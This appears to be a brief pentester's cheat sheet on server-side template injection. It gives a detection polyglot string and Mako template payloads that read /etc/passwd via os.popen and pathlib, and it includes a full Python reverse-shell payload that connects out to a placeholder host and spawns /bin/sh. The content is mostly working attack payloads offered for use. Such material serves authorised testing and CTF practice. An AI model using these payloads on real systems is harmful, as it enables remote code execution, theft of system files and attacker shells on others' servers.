# SSTI

## Resources
- [Hacktricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Detection
```
${{<%[%'"}}%\.
```

## Mako
```python
${4+4}
<%import os;x=os.popen('cat /etc/passwd').read()%>${x}
<%from pathlib import Path;x=Path('/etc/passwd').read_text()%>${x}
<%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);%>
```

